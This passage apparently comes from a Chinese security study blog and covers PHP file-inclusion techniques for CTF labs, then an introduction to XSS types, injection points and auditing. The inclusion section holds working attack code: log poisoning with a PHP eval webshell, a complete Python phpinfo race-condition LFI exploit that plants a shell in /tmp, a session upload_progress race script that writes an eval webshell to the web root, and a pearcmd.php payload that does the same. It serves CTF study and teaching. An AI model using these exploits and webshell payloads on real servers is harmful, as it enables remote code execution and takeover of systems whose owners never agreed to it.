<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209091927344.png" alt="image-20220909192728299"></p>
<p>然后再读取<code>/var/log/nginx/access.log</code>执行日志里的恶意代码</p>
<p>常见出错地方</p>
<ul>
<li>包含的文件路径错误<code>/var/log/nginx/access.log</code></li>
<li>写入的UA语法错误<code>&lt;?php eval($_POST[1]); ?&gt;</code></li>
<li>转义错误<code>file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval($_POST[1]);?&gt;&quot;);</code></li>
</ul>
<p>当php语法中在双引号中的符号需要转义，否则判断为空</p>
<p>即</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[1]);?&gt;&quot;</span> = <span class="meta">&lt;?php</span> <span class="keyword">eval</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这时候我们可以把$符号进行\转义</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(\<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>符号没有进行转义，无法正常执行</p>
<p>如果发生语法错误，污染了题目环境，只能重开容器</p>
<h3 id="临时文件包含"><a href="#临时文件包含" class="headerlink" title="临时文件包含"></a>临时文件包含</h3><p>phpinfo(); 竞争上传，这里有个python2的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup</span>(<span class="params">host, port</span>):</span><br><span class="line">    TAG=<span class="string">&quot;Security Test&quot;</span></span><br><span class="line">    PAYLOAD=<span class="string">&quot;&quot;&quot;%s\r</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents(&#x27;/tmp/g&#x27;, &#x27;&lt;?=eval($_REQUEST[1])?&gt;&#x27;)?&gt;\r&quot;&quot;&quot;</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">&quot;&quot;&quot;-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r&quot;&quot;&quot;</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">&quot;A&quot;</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot; HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: &quot;&quot;&quot;</span> + padding + <span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: &quot;&quot;&quot;</span>+padding+<span class="string">&quot;&quot;&quot;\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s&quot;&quot;&quot;</span> %(<span class="built_in">len</span>(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script   </span></span><br><span class="line">    LFIREQ=<span class="string">&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phpInfoLFI</span>(<span class="params">host, port, phpinforeq, offset, lfireq, tag</span>):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadWorker</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, e, l, m, *args</span>):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span>                </span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&quot;\nGot it! Shell created in /tmp/g&quot;</span></span><br><span class="line">                    self.event.<span class="built_in">set</span>()</span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getOffset</span>(<span class="params">host, port, phpinforeq</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    </span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i        </span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">&quot;0\r\n\r\n&quot;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> i == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;No php tmp_name in phpinfo output&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;found %s at %i&quot;</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;LFI With PHPInfo()&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;-=&quot;</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = <span class="built_in">int</span>(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error with poolsz %d: %s&quot;</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Getting initial offset...&quot;</span>,  </span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">&quot;\r% 4d / % 4d&quot;</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;Woot!  \m/&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;:(&quot;</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;\nTelling threads to shutdown...&quot;</span></span><br><span class="line">        e.<span class="built_in">set</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Shuttin&#x27; down...&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="session文件包含（upload-progress文件上传）"><a href="#session文件包含（upload-progress文件上传）" class="headerlink" title="session文件包含（upload_progress文件上传）"></a>session文件包含（upload_progress文件上传）</h3><p>有包含点，且<code>PHP_SESSION_UPLOAD_PROGRESS</code>不变时，可以使用此脚本</p>
<p><code>session_upload_progress</code>最初是php为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在session中，此时即使用户没有初始化session，php也会自动初始化session。而且，默认情况下<code>session.uoload_progress.enabled</code>是为<code>on</code>的，也就是说这个特性默认开启。所以，我们可以通过这个特性来在目标主机上初始化session。</p>
<p>从上面可以看到，session中一部分数据<code>（session.uoload_progress.enabled）</code>是用户自己控制的。那么我们只要在文件上传的时候，同时post一个恶意字段<code>PHP_SESSION_UPLOAD_PROGRESS</code>，目标服务器的PHP就会自动启用session，session文件将会自动创建。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">session=requests.session()</span><br><span class="line">sess=<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">url=<span class="string">&quot;http://6eb9a422-f96b-4a44-a67d-0d9f9d3e716f.challenges.ctfer.com:8080/&quot;</span> <span class="comment">#靶场地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data1=&#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php echo &quot;success&quot;;file_put_contents(&quot;/var/www/html/1.php&quot;,&quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line">        <span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line">        <span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                r = session.post(url,data=data1,files=file,cookies=cookies)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                r = session.get(url+<span class="string">&quot;?file=../../../../../../../tmp/sess_ctfshow&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;shell 地址为：&quot;</span>+url+<span class="string">&quot;1.php&quot;</span>)</span><br><span class="line">                        exit()</span><br><span class="line">                        </span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">       threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="pear文件包含"><a href="#pear文件包含" class="headerlink" title="pear文件包含"></a>pear文件包含</h3><p>pear模块下有很多php文件，可以利用其中的某个php，分析发现<code>/usr/local/lib/php/PEAR/Command/Install.php</code>存在可利用点</p>
<p><code>/usr/local/lib/php/pearcmd.php</code>存在可利用点</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209092146690.png" alt="image-20220909214644657"></p>
<p>argv注册功能开启了就可以使用这种姿势</p>
<p>可以通过配置文件写入一句话木马</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;aaaa+config-create+/var/www/html/&lt;?=`$_POST[1]`;?&gt;+1.php</span><br></pre></td></tr></table></figure>

<p>其中aaa可以将数据弹出argv，三个➕，四个元素</p>
<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>这里是结合了上边的日志包含，或者可以理解成远程日志包含</p>
<p>这里由于题目过滤了符号. 所以我们可以用<a href="http://www.ab173.com/net/ip2int.php">http://www.ab173.com/net/ip2int.php</a> 将IP转换成纯数字</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209092204124.png" alt="image-20220909220415037"></p>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>Study</tag>
        <tag>PHP_include</tag>
      </tags>
  </entry>
  <entry>
    <title>Web_XSS</title>
    <url>/2022/05/04/web_XSS/</url>
    <content><![CDATA[<p>xss也算是web安全必备吧，一直没学，现在补一补</p>
<p>在这之前先搞清楚xss的原理</p>
<h3 id="XSS的原理和分类"><a href="#XSS的原理和分类" class="headerlink" title="XSS的原理和分类"></a>XSS的原理和分类</h3><p>xss呢就是在web页面插入一段恶意的script代码，用户浏览页面的的时候，嵌入web里的script代码就执行，然后就达到恶意攻击用户的目的。xss是针对用户层面的攻击。</p>
<p>xss有三类：存储型、反射型和DOM型；</p>
<p>存储型XSS：</p>
<p>存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie。</p>
<p><img src="https://img-blog.csdnimg.cn/9c61c961907f4c3abef0610d6cf2644b.png"></p>
<p>反射型XSS：</p>
<p>反射型XSS，非持久化，需要欺骗用户自己去点链接才能触发XSS代码（并没有存储在服务器中），一般容易出现在搜索页面。反射型XSS大多数用来盗取用户的Cookie。</p>
<p><img src="https://img-blog.csdnimg.cn/892ac6177ed64e8c979cb23f29993d5e.png"></p>
<p>DOM型XSS：</p>
<p>DOM型XSS，不经过后端，是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。 DOM的详解：<a href="https://blog.csdn.net/qq_36119192/article/details/82933873">DOM文档对象模型</a></p>
<p>可能触发DOM型XSS的属性：</p>
<blockquote>
<p>document.referer<br>window.name<br>location<br>innerHTML<br>documen.write</p>
</blockquote>
<p>如图，我们在URL中传入参数的值，然后客户端页面通过js脚本利用DOM的方法获得URL中参数的值，再通过DOM方法赋值给选择列表，该过程没有经过后端，完全是在前端完成的。所以，我们就可以在我们输入的参数上做手脚了。</p>
<p><img src="https://img-blog.csdnimg.cn/68be657b44fe4c2ca6ebd50fd51ef380.png"></p>
<h3 id="XSS的攻击载荷"><a href="#XSS的攻击载荷" class="headerlink" title="XSS的攻击载荷"></a>XSS的攻击载荷</h3><p>以下所有标签的 &gt; 都可以用 // 代替， 例如 <code>&lt;script&gt;alert(welcome)&lt;/script//</code></p>
<h4 id="script标签"><a href="#script标签" class="headerlink" title="script标签"></a>script标签</h4><p>script标签是最直接的XSS有效载荷，脚本标记可以引用外部的JavaScript代码，可以将代码插入脚本标记中</p>
<p><img src="https://s1.ax1x.com/2022/05/06/OuurdI.png"></p>
<h4 id="svg标签"><a href="#svg标签" class="headerlink" title="svg标签"></a>svg标签</h4><p><img src="https://s1.ax1x.com/2022/05/06/OuKe0A.png"></p>
<h4 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h4><p><img src="https://s1.ax1x.com/2022/05/06/OuKZmd.png"></p>
<h4 id="body标签"><a href="#body标签" class="headerlink" title="body标签"></a>body标签</h4><p><img src="https://s1.ax1x.com/2022/05/06/OuKEOH.png"></p>
<h4 id="video标签"><a href="#video标签" class="headerlink" title="video标签"></a>video标签</h4><p><img src="https://s1.ax1x.com/2022/05/06/OuKA6e.png"></p>
<h4 id="style标签"><a href="#style标签" class="headerlink" title="style标签"></a>style标签</h4><p><img src="https://s1.ax1x.com/2022/05/06/OuKklD.png"></p>
<h3 id="XSS可以插在哪里？"><a href="#XSS可以插在哪里？" class="headerlink" title="XSS可以插在哪里？"></a>XSS可以插在哪里？</h3><blockquote>
<p>·用户输入作为script标签内容</p>
<p>·用户输入作为HTML注释内容</p>
<p>·用户输入作为HTML标签的属性名</p>
<p>·用户输入作为HTML标签的属性值</p>
<p>·用户输入作为HTML标签的名字</p>
<p>·直接插入到CSS里</p>
<p>tips:最重要的是，千万不要引入任何不可信的第三方JavaScript到页面里！</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#用户输入作为HTML注释内容，导致攻击者可以进行闭合绕过</span><br><span class="line"><span class="comment">&lt;!-- 用户输入 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- --&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!-- --&gt;</span></span><br><span class="line"></span><br><span class="line">#用户输入作为标签属性名，导致攻击者可以进行闭合绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> 用户输入=<span class="string">&quot;xx&quot;</span>&gt;</span>  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">a</span>=<span class="string">&quot;xx&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#用户输入作为标签属性值，导致攻击者可以进行闭合绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;用户输入&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">a</span>=<span class="string">&quot;x&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#用户输入作为标签名，导致攻击者可以进行闭合绕过</span><br><span class="line">&lt;用户输入  id=&quot;xx&quot; /&gt;</span><br><span class="line"><span class="tag">&lt;&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">id</span>=<span class="string">&quot;xx&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">#用户输入作为CSS内容，导致攻击者可以进行闭合绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-xml">用户输入<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span> </span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span> <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="XSS漏洞挖掘"><a href="#XSS漏洞挖掘" class="headerlink" title="XSS漏洞挖掘"></a>XSS漏洞挖掘</h3><h4 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h4><p>尽可能扎到一切用户可控并且能够输出在页面代码中的地方，比如：</p>
<blockquote>
<p>·url的每一个参数</p>
<p>·url本身</p>
<p>·表单</p>
<p>·搜索框</p>
</blockquote>
<p>常见业务场景</p>
<blockquote>
<p>·重灾区：评论区、留言区、个人信息、订单信息等。</p>
<p>·针对性：站内信、网页即时通讯、私信、意见反馈等。</p>
<p>·存在风险：搜索框、当前目录、图片属性等。</p>
</blockquote>
<h4 id="白盒测试（代码审计）"><a href="#白盒测试（代码审计）" class="headerlink" title="白盒测试（代码审计）"></a>白盒测试（代码审计）</h4><p>关于XSS的代码审计主要是从接手参数的地方和一些关键词入手。</p>
<p>PHP中常见的接收参数的方式有<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code>等，可以搜索所有接收参数的地方。然后对接收的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和HTML编码等处理。</p>
<p>也可以搜索类似<code>echo</code>这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取得，是否能控制存到数据库中的数据，存到数据库之前有无过滤等。</p>
<p>大多数程序会接收参数封装在公文文件的函数中统一调用，我们需要审计这些公共函数有没有过滤，能否绕过等。</p>
<h3 id="XSS攻击过程"><a href="#XSS攻击过程" class="headerlink" title="XSS攻击过程"></a>XSS攻击过程</h3><h4 id="反射型XSS漏洞："><a href="#反射型XSS漏洞：" class="headerlink" title="反射型XSS漏洞："></a>反射型XSS漏洞：</h4><blockquote>
<ol>
<li>Alice经常浏览某个网站，此网站为Bob所拥有。Bob的站点需要Alice使用用户名/密码进行登录，并存储了Alice敏感信息(比如银行帐户信息)。</li>
<li>Tom 发现 Bob的站点存在反射性的XSS漏洞</li>
<li>Tom 利用Bob网站的反射型XSS漏洞编写了一个exp，做成链接的形式，并利用各种手段诱使Alice点击</li>
<li>Alice在登录到Bob的站点后，浏览了 Tom 提供的恶意链接</li>
<li>嵌入到恶意链接中的恶意脚本在Alice的浏览器中执行。此脚本盗窃敏感信息(cookie、帐号信息等信息)。然后在Alice完全不知情的情况下将这些信息发送给 Tom。</li>
<li>Tom 利用获取到的cookie就可以以Alice的身份登录Bob的站点，如果脚本的功更强大的话，Tom 还可以对Alice的浏览器做控制并进一步利用漏洞控制</li>
</ol>
</blockquote>
<h4 id="存储型XSS漏洞："><a href="#存储型XSS漏洞：" class="headerlink" title="存储型XSS漏洞："></a>存储型XSS漏洞：</h4><blockquote>
<ol>
<li>Bob拥有一个Web站点，该站点允许用户发布信息/浏览已发布的信息。</li>
<li>Tom检测到Bob的站点存在存储型的XSS漏洞。</li>
<li>Tom在Bob的网站上发布一个带有恶意脚本的热点信息，该热点信息存储在了Bob的服务器的数据库中，然后吸引其它用户来阅读该热点信息。</li>
<li>Bob或者是任何的其他人如Alice浏览该信息之后,Tom的恶意脚本就会执行。</li>
<li>Tom的恶意脚本执行后，Tom就可以对浏览器该页面的用户发动一起XSS攻击</li>
</ol>
</blockquote>
<h3 id="XSS漏洞的危害"><a href="#XSS漏洞的危害" class="headerlink" title="XSS漏洞的危害"></a>XSS漏洞的危害</h3><p><img src="https://img-blog.csdnimg.cn/3ba175ddcd134cf2a436c17602841e2f.png"></p>
